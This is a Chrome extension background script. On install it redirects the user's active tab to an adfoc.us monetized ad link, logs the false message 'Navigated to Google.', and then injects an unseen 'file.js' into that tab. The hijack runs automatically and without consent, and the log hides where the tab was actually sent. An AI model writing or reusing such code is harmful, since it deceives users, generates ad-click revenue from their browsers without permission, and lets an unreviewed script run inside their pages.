chrome.runtime.onInstalled.addListener(() => {
  console.log('Starting extension..');

  setTimeout(() => {
    chrome.tabs.update(undefined, { url: 'http://adfoc.us/8638991' }, () => {
      console.log("Navigated to Google.");
      setTimeout(() => {
        chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
          let tab = tabs[0];
          chrome.scripting.executeScript(
            {
              target: { tabId: tab.id },
              files: ['file.js'], // Correctly refer to the file here
            },
            () => {
              console.log('Script injected.');
            }
          );
        });
      }, 1000);
    });
  }, 1000);
});
